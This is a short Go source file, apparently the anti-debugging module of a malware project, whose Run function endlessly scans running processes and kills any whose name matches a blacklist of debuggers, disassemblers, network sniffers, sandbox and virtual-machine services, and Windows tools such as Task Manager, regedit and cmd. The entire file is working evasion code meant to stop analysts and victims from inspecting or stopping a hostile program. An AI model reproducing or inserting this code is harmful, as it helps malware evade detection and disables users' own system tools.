package antidebug

import (
	"strings"
	"github.com/shirou/gopsutil/v3/process"

)

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if strings.Contains(item, s) {
			return true
		}
	}
	return false
}

func Run() {
	KillProcesses([]string{"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice", "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc", "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice", "qemu-ga", "prl_cc", "prl_tools", "cmd", "joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice"})
}

func KillProcesses(blacklist []string) {
	for {
		processes, _ := process.Processes()

		for _, p := range processes {
			name, _ := p.Name()
			name = strings.ToLower(name)

			if contains(blacklist, name) {
				p.Kill()
			}
		}
	}
}